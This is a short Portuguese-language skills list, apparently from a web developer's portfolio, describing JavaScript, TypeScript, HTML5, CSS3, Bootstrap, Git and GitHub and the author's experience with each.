JavaScript

Linguagem de programação, usada para deixar a página dinâmica. Conheço bem a tecnologia e no momento estou estudando um de seus framework.

TypeScript

TypeScript é um superconjunto de JavaScript, ou seja, um conjunto de ferramentas e formas mais eficientes de escrever código JavaScript, adicionando recursos que não estão presentes de maneira nativa na linguagem.

HTML5

É uma linguagem de marcação utilizada na construção de páginas Web, na qual já tenho certa prática e consigo trabalhar com ela sem nenhuma dificuldade.

CSS3

Utilizado para a estilização de páginas Web, tenho conhecimento em bastantes recursos, além de sempre estar praticando e conhecendo novas funcionalidades.

Bootstrap

Bootstrap é um framework web com código-fonte aberto para desenvolvimento de componentes de interface e front-end para sites e aplicações web, usando HTML, CSS e JavaScript. Já utilizei algumas vezes e ajuda muito devido sua praticidade.

Git

É um sistema de controle de versões distribuído, usado principalmente no desenvolvimento de software.

GitHub

É uma plataforma de hospedagem de código-fonte e arquivos com controle de versão usando o Git.
